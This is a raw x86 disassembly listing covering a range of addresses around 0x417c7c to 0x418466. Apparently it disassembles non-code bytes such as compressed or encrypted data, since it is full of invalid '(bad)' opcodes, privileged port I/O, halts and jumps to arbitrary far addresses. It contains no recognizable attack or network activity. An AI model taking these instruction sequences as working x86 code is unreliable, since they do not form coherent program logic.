  417c7c:	arpl   WORD PTR [ebp-0x4e8ace3c],bp
  417c82:	out    dx,eax
  417c83:	cmp    edx,DWORD PTR [edi+0x4f9685f0]
  417c89:	sub    dl,BYTE PTR [ebx]
  417c8b:	xor    bh,dl
  417c8d:	cmc    
  417c8e:	bound  edx,QWORD PTR [edx]
  417c90:	rol    DWORD PTR [ebx-0x317962a0],0x73
  417c97:	lds    ecx,FWORD PTR [edx+0x1b27ff8c]
  417c9d:	sub    DWORD PTR [eax],esp
  417c9f:	sub    bl,bh
  417ca1:	jl     0x417c75
  417ca3:	loop   0x417c8f
  417ca5:	adc    al,0x1
  417ca7:	adc    BYTE PTR [ebp+0x7cfa335e],dl
  417cad:	imul   ecx,DWORD PTR [ebx+0x254c459a],0x2edb6ac
  417cb7:	aad    0x76
  417cb9:	mov    esp,0xc04faf0d
  417cbe:	dec    ebx
  417cbf:	cmp    esp,DWORD PTR [edx]
  417cc1:	in     al,0xb8
  417cc3:	(bad)  
  417cc4:	push   ebx
  417cc5:	das    
  417cc6:	xor    BYTE PTR [edx],bh
  417cc8:	shl    DWORD PTR [ecx+0x3630e540],0x9e
  417ccf:	das    
  417cd0:	popa   
  417cd1:	push   ebp
  417cd2:	sbb    DWORD PTR [ecx],edi
  417cd4:	sbb    DWORD PTR [eax+eax*1+0x5f87ca88],esp
  417cdb:	sub    DWORD PTR [esi],0xffffff80
  417cde:	dec    ebx
  417cdf:	add    eax,0xec639eb8
  417ce4:	lahf   
  417ce5:	in     eax,dx
  417ce6:	pushf  
  417ce7:	sub    eax,0xb5c00176
  417cec:	(bad)  
  417ced:	imul   DWORD PTR [ebx+0x52]
  417cf0:	add    edi,edi
  417cf2:	mov    edx,0xa4fba9ef
  417cf7:	sub    ch,dh
  417cf9:	out    dx,eax
  417cfa:	data16 mov BYTE PTR [ebp+0x66],al
  417cfe:	push   esp
  417cff:	ja     0x417c8b
  417d01:	xor    dh,BYTE PTR [eax-0x79]
  417d04:	rcl    BYTE PTR [ebp-0x35f4b8b],cl
  417d0a:	mov    BYTE PTR [ebx-0x51],bl
  417d0d:	mov    WORD PTR [esi+0x7b],ds
  417d10:	push   0xc0496211
  417d15:	mov    ds:0xdfcde8a2,eax
  417d1a:	jne    0x417d0e
  417d1c:	push   ecx
  417d1d:	icebp  
  417d1e:	popa   
  417d1f:	cdq    
  417d20:	test   eax,0xd907f0f0
  417d25:	imul   DWORD PTR [ebx-0x2e759ce9]
  417d2b:	out    dx,al
  417d2c:	jb     0x417d37
  417d2e:	enter  0x685f,0x85
  417d32:	into   
  417d33:	sbb    eax,0xe1fcbcfd
  417d38:	lods   eax,DWORD PTR ds:[esi]
  417d39:	sti    
  417d3a:	aaa    
  417d3b:	adc    al,cl
  417d3d:	xchg   ebx,eax
  417d3e:	xchg   ecx,eax
  417d3f:	adc    BYTE PTR ds:0xf53fa0d7,dh
  417d45:	inc    esp
  417d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d47:	xor    bl,BYTE PTR ss:[edx-0x51]
  417d4b:	sub    al,al
  417d4d:	(bad)  
  417d4e:	mov    cl,BYTE PTR [esi]
  417d50:	imul   ebp,DWORD PTR ds:0xd5ad88f1,0xf6b2d759
  417d5a:	mov    ebx,0x84a84206
  417d5f:	jns    0x417d45
  417d61:	mov    ds:0xaf6bd321,eax
  417d66:	xchg   bh,bl
  417d68:	pop    edi
  417d69:	inc    esi
  417d6a:	mov    ebx,0x3ada6947
  417d6f:	out    0xf8,al
  417d71:	sbb    esp,0xfffffff3
  417d74:	lds    esp,FWORD PTR [eax]
  417d76:	and    al,0xd7
  417d78:	(bad)  
  417d79:	lock test edi,eax
  417d7c:	call   0x47679c4
  417d81:	test   BYTE PTR [ebx-0x18f1d8e0],ah
  417d87:	jl     0x417d3a
  417d89:	hlt    
  417d8a:	aaa    
  417d8b:	xor    eax,eax
  417d8d:	xchg   esi,edx
  417d8f:	push   ebx
  417d90:	mov    cl,0x64
  417d92:	or     edi,DWORD PTR [eax-0x12b6a964]
  417d98:	xor    al,0xc7
  417d9a:	pop    edx
  417d9b:	(bad)  
  417d9c:	and    al,0xdd
  417d9e:	sahf   
  417d9f:	sub    eax,ebp
  417da1:	adc    dl,BYTE PTR ds:0x2aad8337
  417da7:	jmp    0x4a06:0xfb50bdf3
  417dae:	shl    al,0xd5
  417db1:	pop    ebp
  417db2:	or     edx,DWORD PTR [ebp+0x66]
  417db5:	jns    0x417dea
  417db7:	add    al,0xab
  417db9:	idiv   DWORD PTR [ebx+0x1b]
  417dbc:	ins    DWORD PTR es:[edi],dx
  417dbd:	in     eax,dx
  417dbe:	mov    edi,0x8c6110
  417dc3:	pop    ds
  417dc4:	xor    al,0x53
  417dc6:	push   ebp
  417dc7:	out    dx,eax
  417dc8:	fsubr  st,st(4)
  417dca:	jmp    0x417e49
  417dcc:	ds jb  0x417e1e
  417dcf:	sbb    DWORD PTR [ebp+edx*4+0x782da52],0xffffffa7
  417dd7:	sbb    al,0x13
  417dd9:	data16 test BYTE PTR cs:[ebp-0x6a661b0c],0xdc
  417de2:	inc    esp
  417de3:	fld    TBYTE PTR [esi]
  417de5:	ins    DWORD PTR es:[edi],dx
  417de6:	es pop ds
  417de8:	or     BYTE PTR [eax],ch
  417dea:	push   ss
  417deb:	dec    edi
  417dec:	fcomp  QWORD PTR [eax+0x6fd1decc]
  417df2:	sub    eax,0xc2a01e42
  417df7:	aad    0x44
  417df9:	pop    esi
  417dfa:	jmp    0x417e58
  417dfc:	ja     0x417e66
  417dfe:	les    esp,FWORD PTR [esi]
  417e00:	jecxz  0x417da0
  417e02:	push   es
  417e03:	lahf   
  417e04:	add    dh,BYTE PTR [ebp+0x71b6e449]
  417e0a:	mov    al,ds:0x12bd3d3a
  417e0f:	push   0x48da55bc
  417e14:	or     DWORD PTR [edx+0x14c5aad7],0x61
  417e1b:	call   0xd1aa:0xbdcc648c
  417e22:	hlt    
  417e23:	pushf  
  417e24:	out    0x5c,eax
  417e26:	cdq    
  417e27:	mov    bh,0xab
  417e29:	jns    0x417ddc
  417e2b:	pop    es
  417e2c:	mov    ds:0x46427a8d,al
  417e31:	mov    ecx,0x710139bf
  417e36:	sbb    eax,0xfe25e964
  417e3b:	cli    
  417e3c:	pop    ebp
  417e3d:	inc    esp
  417e3e:	fadd   st,st(4)
  417e40:	xor    al,0x7a
  417e42:	pop    esp
  417e43:	int3   
  417e44:	jecxz  0x417e9f
  417e46:	adc    al,0x2f
  417e48:	mov    esi,0xc69f08fd
  417e4d:	or     bl,BYTE PTR [edx]
  417e4f:	push   esi
  417e50:	inc    ecx
  417e51:	fimul  DWORD PTR [edx]
  417e53:	inc    esi
  417e54:	iret   
  417e55:	adc    al,0xd0
  417e57:	push   esp
  417e58:	imul   esi,DWORD PTR [ecx+0x29],0xa2587dcc
  417e5f:	mov    WORD PTR [ecx-0x74],cs
  417e62:	fild   DWORD PTR [eax+0x1d]
  417e65:	sbb    ebp,esp
  417e67:	or     ebp,DWORD PTR [eax]
  417e69:	pusha  
  417e6a:	xor    esi,ecx
  417e6c:	dec    eax
  417e6d:	lea    ecx,[eax]
  417e6f:	(bad)  [ecx-0x19e1c0d3]
  417e75:	dec    ecx
  417e76:	mov    ecx,0x216a4dc5
  417e7b:	sar    DWORD PTR [ebp-0x1b],1
  417e7e:	mov    eax,0x4f00b41e
  417e83:	lahf   
  417e84:	mov    al,0x72
  417e86:	push   cs
  417e87:	mov    eax,ds:0x40c5847f
  417e8c:	shl    BYTE PTR [edx],cl
  417e8e:	xor    eax,0xb4712d6c
  417e93:	cmp    edx,ecx
  417e95:	popa   
  417e96:	or     al,0xad
  417e98:	stos   DWORD PTR es:[edi],eax
  417e99:	adc    BYTE PTR [eax-0x372837a1],bl
  417e9f:	mov    ch,0x63
  417ea1:	mov    dh,0xc6
  417ea3:	add    ecx,DWORD PTR [edx]
  417ea5:	je     0x417ef7
  417ea7:	test   eax,0x44b05bbd
  417eac:	inc    ebp
  417ead:	lods   eax,DWORD PTR ds:[esi]
  417eae:	adc    dl,ch
  417eb0:	pop    edx
  417eb1:	call   FWORD PTR [ecx+0x55]
  417eb4:	mov    bl,ch
  417eb6:	add    BYTE PTR [ebx+0x72],bh
  417eb9:	mov    cl,BYTE PTR [ecx]
  417ebb:	push   ds
  417ebc:	pop    esi
  417ebd:	outs   dx,BYTE PTR ds:[esi]
  417ebe:	(bad)  [esi-0x6061cd0]
  417ec4:	outs   dx,BYTE PTR ds:[esi]
  417ec5:	in     eax,0x5
  417ec7:	call   FWORD PTR [edi-0x76]
  417eca:	pop    ecx
  417ecb:	pop    eax
  417ecc:	pop    edx
  417ecd:	test   BYTE PTR gs:[ebx+edi*1+0xc155205],ah
  417ed5:	push   0x716cea7c
  417eda:	or     eax,0xfada084a
  417edf:	mov    esp,ecx
  417ee1:	mov    BYTE PTR [ebx],ch
  417ee3:	xchg   esi,eax
  417ee4:	(bad)  
  417ee5:	lock loopne 0x417ebd
  417ee8:	loopne 0x417f5b
  417eea:	shl    DWORD PTR ds:0x359c3889,cl
  417ef0:	outs   dx,BYTE PTR ds:[esi]
  417ef1:	ss js  0x417f58
  417ef4:	lahf   
  417ef5:	xchg   ebx,eax
  417ef6:	setns  BYTE PTR [ebx+0x66]
  417efa:	adc    al,0x7b
  417efc:	mov    WORD PTR [edx-0x4b],?
  417eff:	push   edi
  417f00:	or     DWORD PTR [ebx-0x1e],ebx
  417f03:	mov    cl,0x81
  417f05:	lds    edi,FWORD PTR [edx-0x443aa2a7]
  417f0b:	and    eax,0xf0517b77
  417f10:	xor    BYTE PTR [esi+edx*1],ah
  417f13:	hlt    
  417f14:	pushf  
  417f15:	mov    dl,0x84
  417f17:	fild   WORD PTR [ecx-0x33c73f06]
  417f1d:	leave  
  417f1e:	test   dh,0x27
  417f21:	arpl   WORD PTR [edx],si
  417f23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f24:	add    dh,al
  417f26:	inc    esi
  417f27:	std    
  417f28:	rol    DWORD PTR [edi+eiz*4+0x2d],1
  417f2c:	dec    eax
  417f2d:	and    al,0x71
  417f2f:	jbe    0x417f19
  417f31:	sbb    bl,BYTE PTR [eax+0x21]
  417f34:	shr    BYTE PTR [ebx+0x773b3c9d],cl
  417f3a:	shr    bl,0x3a
  417f3d:	push   ds
  417f3e:	jno    0x417fa6
  417f40:	adc    DWORD PTR [eax+0x60acd085],eax
  417f46:	cdq    
  417f47:	dec    edi
  417f48:	neg    BYTE PTR [ecx+edi*4]
  417f4b:	shl    DWORD PTR [eax+esi*2],0xb1
  417f4f:	jno    0x417f6d
  417f51:	js     0x417fa0
  417f53:	jg     0x417fb0
  417f55:	mov    al,ds:0x34d5821b
  417f5a:	stos   BYTE PTR es:[edi],al
  417f5b:	and    al,0x3
  417f5d:	mov    ch,0xee
  417f5f:	repnz and cl,BYTE PTR [ebx]
  417f62:	and    eax,0x464f5f3
  417f67:	repz cli 
  417f69:	out    0xf1,eax
  417f6b:	(bad)  [esi-0x32]
  417f6e:	adc    eax,0xcf423d20
  417f73:	add    BYTE PTR [ecx+0x77b2315a],bh
  417f79:	iret   
  417f7a:	jns    0x417f98
  417f7c:	cmp    edx,DWORD PTR [ecx+0x77]
  417f7f:	jmp    0x417fd8
  417f81:	fwait
  417f82:	jecxz  0x417f79
  417f84:	inc    esp
  417f85:	xchg   esp,eax
  417f86:	add    eax,0xa0c85954
  417f8b:	sbb    al,0x9b
  417f8d:	in     eax,dx
  417f8e:	int3   
  417f8f:	xchg   esp,eax
  417f90:	xor    BYTE PTR [eax],bh
  417f92:	fcomip st,st(1)
  417f94:	mov    esi,0x189db722
  417f99:	push   ds
  417f9a:	lods   eax,DWORD PTR ds:[esi]
  417f9b:	mov    edx,DWORD PTR [eax-0x3a]
  417f9e:	(bad)  
  417f9f:	mov    ecx,0x4d328617
  417fa4:	stc    
  417fa5:	ins    BYTE PTR es:[edi],dx
  417fa6:	scas   eax,DWORD PTR es:[edi]
  417fa7:	cmp    DWORD PTR [edi-0x66],0xb
  417fab:	ins    DWORD PTR es:[edi],dx
  417fac:	(bad)  
  417fad:	sbb    al,0x52
  417faf:	xor    al,0xd4
  417fb1:	rcr    cl,1
  417fb3:	adc    al,0xce
  417fb5:	js     0x417f7a
  417fb7:	daa    
  417fb8:	add    BYTE PTR [esi],al
  417fba:	xchg   ebx,eax
  417fbb:	repz int3 
  417fbd:	inc    ebp
  417fbe:	cmp    esp,edi
  417fc0:	xchg   BYTE PTR [ebx-0x5562bacd],al
  417fc6:	call   0x71994cf0
  417fcb:	enter  0xc73c,0x0
  417fcf:	sub    edi,ebp
  417fd1:	push   0xf5b0eaa2
  417fd6:	nop
  417fd7:	and    ah,BYTE PTR [esi-0x5d09996b]
  417fdd:	mov    bl,0x88
  417fdf:	mov    ch,0x81
  417fe1:	mov    eax,ds:0xa73dadc9
  417fe6:	and    al,0x3f
  417fe8:	mov    ebp,0x17c12b07
  417fed:	jecxz  0x417f6f
  417fef:	sbb    eax,0x928d46dc
  417ff4:	cmp    al,0x6b
  417ff6:	jge    0x417f99
  417ff8:	out    dx,al
  417ff9:	inc    ecx
  417ffa:	xchg   ebx,eax
  417ffb:	and    BYTE PTR ds:0xa55ccaf7,al
  418001:	je     0x417fbe
  418003:	sbb    bh,BYTE PTR [esi]
  418005:	jmp    0x42d2:0xe145b9c2
  41800c:	adc    eax,0xcb78dff4
  418011:	xchg   BYTE PTR [edi-0x6f98c5e1],al
  418017:	out    dx,eax
  418018:	jle    0x418094
  41801a:	mov    eax,0x82d3dfcd
  41801f:	bound  ebp,QWORD PTR [esi+0x4b]
  418022:	jo     0x417fc9
  418024:	test   eax,0xdb1255bd
  418029:	int    0x50
  41802b:	xchg   esi,eax
  41802c:	sbb    BYTE PTR [edx+ecx*1+0x6f],al
  418030:	mov    ebp,0x978e299
  418035:	xchg   DWORD PTR [ebx],esi
  418037:	popa   
  418038:	push   es
  418039:	or     eax,0x5789b226
  41803e:	int3   
  41803f:	push   edi
  418040:	imul   DWORD PTR [ebx]
  418042:	(bad)  
  418043:	cmp    DWORD PTR [eax-0x4654459b],edi
  418049:	rol    DWORD PTR ds:0xb6d36827,cl
  41804f:	int    0x2c
  418051:	cmc    
  418052:	dec    esp
  418053:	xor    BYTE PTR [ebp+0x17e40ca8],ch
  418059:	ror    DWORD PTR [edx],cl
  41805b:	xchg   edx,eax
  41805c:	rcr    bl,cl
  41805e:	xor    BYTE PTR [eax-0x5b1e6385],ah
  418064:	(bad)  
  418065:	addr16 add eax,0x27bd453e
  41806b:	and    al,BYTE PTR [esi]
  41806d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41806e:	xchg   ebp,eax
  41806f:	sbb    eax,0x16eb6158
  418074:	mov    edx,0x6d297f7d
  418079:	rcr    dh,1
  41807b:	or     DWORD PTR [eax-0x2a],0x51e86b02
  418082:	pop    ebx
  418083:	js     0x41809d
  418085:	sbb    eax,0x5597dc11
  41808a:	imul   BYTE PTR [ebp+0x30]
  41808d:	xchg   BYTE PTR [edi-0x4ef14560],cl
  418093:	mov    esi,edi
  418095:	dec    esi
  418096:	(bad)  
  418097:	fstp   TBYTE PTR ds:0xc406888d
  41809d:	jns    0x4180fe
  41809f:	cmp    ah,BYTE PTR [eax-0x460f70ad]
  4180a5:	jle    0x41805b
  4180a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180a8:	adc    esp,DWORD PTR [edx-0x1f1d17e3]
  4180ae:	fild   QWORD PTR [edi-0x5d]
  4180b1:	cli    
  4180b2:	(bad)  
  4180b3:	dec    ebp
  4180b4:	xchg   cx,ax
  4180b6:	fistp  QWORD PTR [esi-0x17]
  4180b9:	dec    ebp
  4180ba:	push   esi
  4180bb:	bound  ebx,QWORD PTR [eax]
  4180bd:	shl    BYTE PTR [edx-0x4de13fcc],1
  4180c3:	stos   BYTE PTR es:[edi],al
  4180c4:	(bad)  
  4180c6:	pushw  0x5a
  4180c9:	push   ecx
  4180ca:	sar    DWORD PTR [edi+eax*8+0x47dbe783],cl
  4180d1:	inc    ebp
  4180d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180d3:	dec    esi
  4180d4:	not    BYTE PTR [ecx]
  4180d6:	add    esi,DWORD PTR [ebp+0x6b]
  4180d9:	mov    al,0x11
  4180db:	shl    DWORD PTR ds:[esi+ebp*8],1
  4180df:	jbe    0x4180b5
  4180e1:	mov    al,BYTE PTR [eax+0x1f]
  4180e4:	lahf   
  4180e5:	xchg   ebx,eax
  4180e6:	fs dec eax
  4180e8:	cmp    DWORD PTR [edi-0x7f],edi
  4180eb:	sar    edi,0xa7
  4180ee:	ret    
  4180ef:	sbb    al,0x7e
  4180f1:	aaa    
  4180f2:	imul   ecx,DWORD PTR [esi],0x1d16c245
  4180f8:	shl    BYTE PTR [ebx],1
  4180fa:	lahf   
  4180fb:	cmc    
  4180fc:	loopne 0x4180c3
  4180fe:	cmp    eax,0x52afc67e
  418103:	pop    ebp
  418104:	aam    0x5e
  418106:	stos   DWORD PTR es:[edi],eax
  418107:	cmp    eax,0xa0e71b90
  41810c:	les    eax,FWORD PTR [ecx-0x44]
  41810f:	pusha  
  418110:	lahf   
  418111:	jl     0x4180b0
  418113:	mov    eax,0x47b3e53
  418118:	lods   al,BYTE PTR ds:[esi]
  418119:	dec    edx
  41811a:	stos   BYTE PTR es:[edi],al
  41811b:	iret   
  41811c:	cli    
  41811d:	and    al,0x37
  41811f:	mov    esp,0xf89193d5
  418124:	cmp    esi,ebp
  418126:	(bad)  
  418127:	xor    al,0x96
  418129:	xchg   edi,eax
  41812a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41812b:	sub    bl,dl
  41812d:	dec    BYTE PTR [edx-0x652a2f56]
  418133:	(bad)  
  418134:	gs and eax,0xd1978ace
  41813a:	mov    ebp,0xbc504f80
  41813f:	pop    esi
  418140:	xchg   esi,eax
  418141:	xor    DWORD PTR [esi+0x34ff795c],ecx
  418147:	sbb    eax,0x6f2053c1
  41814c:	mov    ds:0x22572966,al
  418151:	sbb    BYTE PTR [esi+edx*2+0x5bba962b],al
  418158:	and    DWORD PTR [edx-0x21e1aac3],edi
  41815e:	aam    0x72
  418160:	scas   eax,DWORD PTR es:[edi]
  418161:	outs   dx,BYTE PTR ds:[esi]
  418162:	call   0x4f98:0xb1cdc921
  418169:	ja     0x4181b8
  41816b:	leave  
  41816c:	adc    DWORD PTR [ebp+ebx*1-0x1c],0xf0a037e
  418174:	xchg   BYTE PTR [edx+0x178388f5],bh
  41817a:	and    bh,ah
  41817c:	and    BYTE PTR [esi+eiz*2],dh
  41817f:	(bad)  
  418180:	mov    ds:0x2be9ea24,al
  418185:	scas   al,BYTE PTR es:[edi]
  418186:	sub    DWORD PTR [esi+eiz*2-0x2],ecx
  41818a:	outs   dx,DWORD PTR ds:[esi]
  41818b:	loop   0x4181ce
  41818d:	adc    eax,0x195d72
  418192:	fsub   DWORD PTR [edx-0x45]
  418195:	ins    BYTE PTR es:[edi],dx
  418196:	xchg   ebx,eax
  418197:	cmp    eax,esp
  418199:	or     al,0x8a
  41819b:	push   es
  41819c:	clc    
  41819d:	jmp    0xd655439f
  4181a2:	xor    DWORD PTR [ecx+ebx*8],ebp
  4181a5:	arpl   ax,si
  4181a7:	inc    ebp
  4181a8:	pop    esp
  4181a9:	stos   BYTE PTR es:[edi],al
  4181aa:	ret    0x129d
  4181ad:	div    DWORD PTR [edi]
  4181af:	hlt    
  4181b0:	(bad)  [ecx+0x5e5f4e13]
  4181b6:	sub    eax,0x81163c6d
  4181bb:	pop    es
  4181bc:	jne    0x4181fc
  4181be:	cwde   
  4181bf:	or     al,0xee
  4181c1:	aaa    
  4181c2:	cs (bad) 
  4181c4:	mov    cl,0xfd
  4181c6:	popa   
  4181c7:	xor    eax,0x4c1b184c
  4181cc:	sbb    al,0xf9
  4181ce:	sub    dh,ch
  4181d0:	lods   eax,DWORD PTR ds:[esi]
  4181d1:	enter  0x1453,0xe7
  4181d5:	or     eax,ebx
  4181d7:	mov    esi,0x73ce2402
  4181dc:	mov    eax,ds:0xf6ab14ff
  4181e1:	lds    ebx,FWORD PTR [ebx]
  4181e3:	jg     0x418182
  4181e5:	je     0x41822f
  4181e7:	sbb    al,0x22
  4181e9:	pop    es
  4181ea:	rcl    al,1
  4181ec:	pusha  
  4181ed:	mov    ch,dh
  4181ef:	mov    ds:0x84be9222,eax
  4181f4:	es icebp 
  4181f6:	inc    ebx
  4181f7:	dec    ebx
  4181f8:	or     BYTE PTR [ebp-0x5f],al
  4181fb:	(bad)
  4181fe:	mul    edi
  418200:	push   cs
  418201:	or     al,bh
  418203:	mov    cl,0xb4
  418205:	aad    0x4b
  418207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418208:	cs cli 
  41820a:	and    dh,BYTE PTR [eax-0x2f5ecafd]
  418210:	push   edi
  418211:	stc    
  418212:	adc    dl,BYTE PTR [edi-0x30c2bb25]
  418218:	repnz add ebp,ebx
  41821b:	cmp    eax,0x87274905
  418220:	xchg   edi,eax
  418221:	push   ds
  418222:	jmp    0x18cb:0x4f4c20e5
  418229:	shl    esi,0x40
  41822c:	cmp    esp,DWORD PTR [edi]
  41822e:	push   ecx
  41822f:	cmp    DWORD PTR [esp+ecx*1],ebp
  418232:	mov    ds:0xb6f316b4,al
  418237:	xchg   esi,eax
  418238:	or     DWORD PTR [ebx-0x2e],0xffffffa9
  41823c:	xchg   ebx,eax
  41823d:	push   es
  41823e:	or     DWORD PTR [edi],0xffffff90
  418241:	jg     0x4182a9
  418243:	fcmovnbe st,st(4)
  418245:	sti    
  418246:	repz (bad) 
  418248:	jecxz  0x4182b5
  41824a:	push   eax
  41824b:	inc    ecx
  41824c:	aam    0x7e
  41824e:	or     BYTE PTR [edx+0x846f47],cl
  418254:	push   ecx
  418255:	push   edx
  418256:	sub    edx,DWORD PTR [ecx+0x16af565d]
  41825c:	and    esi,esp
  41825e:	or     DWORD PTR [eax+ebx*2],ebp
  418261:	out    0xec,eax
  418263:	iret   
  418264:	mov    bl,0xe2
  418266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418267:	iret   
  418268:	cmc    
  418269:	fistp  QWORD PTR [ebp-0x57]
  41826c:	inc    esi
  41826d:	fild   QWORD PTR [eax]
  41826f:	mov    WORD PTR [esi+0x1c45315c],es
  418275:	jl     0x4182cd
  418277:	std    
  418278:	pop    es
  418279:	pop    edx
  41827a:	push   edx
  41827b:	in     al,dx
  41827c:	add    dl,BYTE PTR [edx-0xb159bf9]
  418282:	mov    bh,0x7a
  418284:	shr    BYTE PTR [esi+0x11],0x17
  418288:	scas   eax,DWORD PTR es:[edi]
  418289:	mov    dh,0x4f
  41828b:	add    eax,0xd0be0f9
  418290:	or     eax,0x8429db28
  418295:	jnp    0x418288
  418297:	mov    BYTE PTR [esi+0x6d],0x70
  41829b:	adc    dl,BYTE PTR es:[edx]
  41829e:	sbb    eax,0x841354db
  4182a3:	add    eax,0x51528f4c
  4182a8:	cmp    eax,0x2af3e0b8
  4182ad:	jecxz  0x418258
  4182af:	mov    cl,0xba
  4182b1:	sti    
  4182b2:	cmp    BYTE PTR [edx+eax*4-0x2e],ah
  4182b6:	je     0x418336
  4182b8:	jge    0x418306
  4182ba:	sti    
  4182bb:	sbb    eax,DWORD PTR [esi*2+0x75ff3ebd]
  4182c2:	js     0x418283
  4182c4:	and    esp,ecx
  4182c6:	adc    eax,esi
  4182c8:	add    BYTE PTR [ecx-0xf],al
  4182cb:	pop    eax
  4182cc:	bound  ecx,QWORD PTR [ebp+0x7a977f20]
  4182d2:	mov    bh,0xf9
  4182d4:	or     edi,edi
  4182d6:	sbb    ebx,ecx
  4182d8:	mov    edx,0xad258d18
  4182dd:	sti    
  4182de:	mov    ebx,0xc12cb19f
  4182e3:	shl    DWORD PTR [edx-0x6da176ca],1
  4182e9:	push   eax
  4182ea:	jne    0x41832c
  4182ec:	xchg   ecx,eax
  4182ed:	sbb    al,0x51
  4182ef:	loope  0x41833a
  4182f1:	enter  0xc9a6,0xde
  4182f5:	aas    
  4182f6:	call   0x414a:0x68915baa
  4182fd:	jmp    0x418356
  4182ff:	(bad)  
  418300:	sub    ebp,DWORD PTR [ebx]
  418302:	cmp    edx,DWORD PTR [esi-0x7ff73d5a]
  418308:	jbe    0x41834a
  41830a:	(bad)  [ecx+0x6d]
  41830d:	hlt    
  41830e:	test   eax,0xaa0b0ec4
  418313:	int    0xbe
  418315:	adc    eax,0x3541e0a0
  41831a:	add    bh,bl
  41831c:	pop    eax
  41831d:	jo     0x418386
  41831f:	jl     0x41839d
  418321:	dec    ebp
  418322:	fild   WORD PTR [ebp-0x90aa28a]
  418328:	lods   eax,DWORD PTR ds:[esi]
  418329:	imul   esp,DWORD PTR [edi],0x6f
  41832c:	mov    cl,0xf0
  41832e:	aad    0x14
  418330:	cli    
  418331:	(bad)  
  418332:	mov    al,0x9
  418334:	push   edx
  418335:	adc    eax,esp
  418337:	imul   edi,eax,0x2c
  41833a:	in     eax,dx
  41833b:	data16 mov ch,0x21
  41833e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41833f:	test   BYTE PTR [ebp*8+0x7a1341ae],dl
  418346:	sti    
  418347:	sbb    ah,ah
  418349:	sbb    ebp,DWORD PTR [eax-0x65]
  41834c:	mov    ds:0x54f1a280,eax
  418351:	or     al,BYTE PTR ds:0x3598949
  418357:	(bad)  
  418358:	enter  0x71c1,0x5b
  41835c:	adc    dh,BYTE PTR [esp+esi*2]
  41835f:	xlat   BYTE PTR ds:[ebx]
  418360:	repz mov al,0xe1
  418363:	ins    DWORD PTR es:[edi],dx
  418364:	fs ret 
  418366:	test   al,0xc3
  418368:	push   0x79f952f3
  41836d:	test   dh,dh
  41836f:	jmp    0x418385
  418371:	dec    ebp
  418372:	dec    esi
  418373:	test   BYTE PTR [ebx+ecx*4],0x53
  418377:	call   0xdea521ea
  41837c:	jp     0x4183ba
  41837e:	mov    dl,0xb5
  418380:	jle    0x418385
  418382:	bound  esi,QWORD PTR [edx]
  418384:	int3   
  418385:	or     bh,BYTE PTR ds:0x8ff0cadd
  41838b:	jns    0x418360
  41838d:	les    edi,FWORD PTR [ecx]
  41838f:	shl    DWORD PTR [esi+0x616fe690],0x97
  418396:	mov    ebp,0x2a5a5d40
  41839b:	add    bl,ah
  41839d:	loop   0x4183be
  41839f:	xor    DWORD PTR [esi+0xb],edi
  4183a2:	ret    0xd7ca
  4183a5:	pusha  
  4183a6:	mov    WORD PTR [edx+0x74fb2daf],es
  4183ac:	pop    esp
  4183ad:	push   esi
  4183ae:	dec    esp
  4183af:	popf   
  4183b0:	and    al,ah
  4183b2:	cmp    BYTE PTR [esi],ah
  4183b4:	sub    BYTE PTR [eax+0xb],0xc7
  4183b8:	leave  
  4183b9:	std    
  4183ba:	push   es
  4183bb:	loopne 0x4183cb
  4183bd:	jmp    0xbb7dae56
  4183c2:	out    dx,eax
  4183c3:	cld    
  4183c4:	je     0x41835b
  4183c6:	mov    al,ds:0x6f4587ad
  4183cb:	xchg   edi,eax
  4183cc:	and    cl,BYTE PTR [eax]
  4183ce:	in     al,0x69
  4183d0:	(bad)  
  4183d1:	cmp    dh,BYTE PTR [ebp+0x2483e59b]
  4183d7:	leave  
  4183d8:	(bad)  
  4183d9:	scas   al,BYTE PTR es:[edi]
  4183da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183db:	mov    eax,0x329f82b1
  4183e0:	int3   
  4183e1:	or     BYTE PTR [esi-0xd],al
  4183e4:	mov    ch,0x54
  4183e6:	mov    cl,0xe1
  4183e8:	jbe    0x4183da
  4183ea:	fidivr WORD PTR [eax+ebx*8+0x59]
  4183ee:	fisttp QWORD PTR [ecx*2+0x2f3a9431]
  4183f5:	and    edx,esp
  4183f7:	fcomp  DWORD PTR [ecx+0xe]
  4183fa:	in     al,dx
  4183fb:	cmc    
  4183fc:	mov    es,WORD PTR ds:0x8a070a4
  418402:	sbb    edi,ebp
  418404:	sbb    al,0x9c
  418406:	test   eax,0x77f98ff4
  41840b:	outs   dx,BYTE PTR ds:[esi]
  41840c:	push   ss
  41840d:	cmp    ecx,edi
  41840f:	ror    BYTE PTR [edx-0x5245271],0xaf
  418416:	aam    0x1e
  418418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418419:	xor    eax,0x773934c8
  41841e:	out    0xb7,eax
  418420:	sbb    al,0x7e
  418422:	add    esp,DWORD PTR [eax+0x35206652]
  418428:	das    
  418429:	outs   dx,BYTE PTR ds:[esi]
  41842a:	out    0xf3,al
  41842c:	mov    al,0xd6
  41842e:	imul   ebp,ebp,0x3bec3bcd
  418434:	pushf  
  418435:	jno    0x41849f
  418437:	mov    al,0xad
  418439:	ss push cs
  41843b:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41843d:	push   cs
  41843e:	retf   0x151c
  418441:	and    ebx,DWORD PTR [esi+0x17]
  418444:	push   ebx
  418445:	push   ss
  418446:	add    bh,BYTE PTR [edx-0x230029ab]
  41844c:	sahf   
  41844d:	icebp  
  41844e:	bound  esi,QWORD PTR [eax]
  418450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418451:	aam    0xee
  418453:	push   ds
  418454:	daa    
  418455:	mov    al,ds:0x94077377
  41845a:	cmc    
  41845b:	pop    ebx
  41845c:	dec    edx
  41845d:	cmp    esp,DWORD PTR [esi]
  41845f:	adc    eax,0x60e59bab
  418464:	pop    ss
  418465:	xchg   ebx,eax
  418466:	adc    DWORD PTR [ebx+ecx*2+0x30823d7c],esi
